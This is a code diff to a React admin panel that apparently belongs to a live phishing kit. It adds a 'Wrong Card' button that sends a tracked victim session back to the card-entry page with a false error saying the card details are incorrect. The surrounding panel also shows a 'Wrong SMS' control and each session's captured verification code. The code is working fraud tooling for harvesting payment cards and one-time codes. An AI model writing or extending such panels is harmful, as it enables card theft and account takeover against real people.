@@ -254,6 +254,32 @@ const AdminPanel = () => {
     }
   };
 
+  const sendWrongCardMessage = async (sessionId: string) => {
+    // Update step to card page and send error message
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        current_step: 2,
+        admin_message: "The card details you entered are incorrect. Please check and try again.",
+        message_type: "error"
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending message:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send client back",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Client Sent Back",
+        description: "Wrong card alert sent, client returned to card page",
+      });
+    }
+  };
+
   const sendMessage = async (sessionId: string) => {
     const input = messageInputs[sessionId];
     if (!input?.message || !input?.type) {
@@ -606,6 +632,15 @@ const AdminPanel = () => {
                               Wrong SMS
                             </Button>
                           </div>
+                          <Button
+                            variant="outline"
+                            size="sm"
+                            className="w-full gap-2 text-orange-600 border-orange-500 hover:bg-orange-500 hover:text-white"
+                            onClick={() => sendWrongCardMessage(session.id)}
+                          >
+                            <CreditCard className="w-4 h-4" />
+                            Wrong Card
+                          </Button>
                           {session.verification_code && (
                             <div className="p-2 rounded bg-muted text-center">
                               <span className="text-xs text-muted-foreground">Current Code: </span>
